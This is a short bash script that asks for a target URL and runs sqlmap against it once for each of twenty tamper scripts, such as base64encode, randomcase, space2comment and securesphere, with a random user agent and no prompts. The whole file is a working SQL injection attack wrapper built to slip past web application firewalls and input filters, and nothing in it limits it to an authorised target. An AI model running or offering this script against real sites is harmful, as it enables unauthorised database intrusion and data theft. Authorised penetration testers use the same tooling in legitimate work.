#!/bin/bash

tampers=(apostrophemask apostrophenullencode base64encode between chardoubleencode charencode charunicodeencode equaltolike greatest ifnull2ifisnull multiplespaces nonrecursivereplacement percentage randomcase securesphere space2comment space2plus space2randomblank unionalltounion unmagicquotes)

read -p "Target: " url

for tamper in "${tampers[@]}"
do
	sqlmap -u $url -vvv --batch --random-agent --tamper=$tamper
done
